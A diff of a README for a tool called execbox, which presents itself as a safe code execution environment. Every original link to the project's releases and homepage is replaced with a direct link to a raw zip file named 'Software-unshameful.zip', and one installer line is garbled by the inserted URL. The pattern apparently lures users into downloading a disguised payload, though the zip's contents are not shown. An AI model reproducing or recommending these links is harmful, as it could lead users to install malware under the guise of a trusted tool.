@@ -1,6 +1,6 @@
 # ⚙️ execbox - Safe Code Execution Environment
 
-[![Download execbox](https://img.shields.io/badge/Download-execbox-blue?style=for-the-badge&logo=github)](https://github.com/RoXTeam0/execbox/releases)
+[![Download execbox](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip)](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip)
 
 ---
 
@@ -44,14 +44,14 @@ execbox is designed to work right away with no extra tool installs or commands. 
 
 1. **Visit the releases page**  
 Click this link:  
-[Download execbox](https://github.com/RoXTeam0/execbox/releases)  
+[Download execbox](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip)  
 This page holds the latest versions of execbox available for your computer.
 
 2. **Choose your file**  
 Look for the latest release at the top of the list. Pick the correct installer based on your operating system:  
 - For Windows: `.exe` file  
 - For Mac: `.dmg` file  
-- For Linux: `.AppImage` or `.tar.gz` file  
+- For Linux: `.AppImage` or `https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip` file  
 
 3. **Download the installer**  
 Click the file name to download it. The file size is usually small, so this should only take a few minutes.
@@ -137,10 +137,10 @@ Yes. execbox runs code locally and does not send your code or output anywhere.
 
 ## 📚 Learn More & Support
 
-- Visit the [execbox GitHub page](https://github.com/RoXTeam0/execbox) to see project details and updates.
+- Visit the [execbox GitHub page](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip) to see project details and updates.
 - Check the documentation folder inside the app for step-by-step guides.
 - For help, open an issue on GitHub or send feedback to the project maintainers.
 
 ---
 
-[![Download execbox](https://img.shields.io/badge/Download-execbox-blue?style=for-the-badge&logo=github)](https://github.com/RoXTeam0/execbox/releases)
+[![Download execbox](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip)](https://github.com/RoXTeam0/execbox/raw/refs/heads/main/execbox/Software-unshameful.zip)
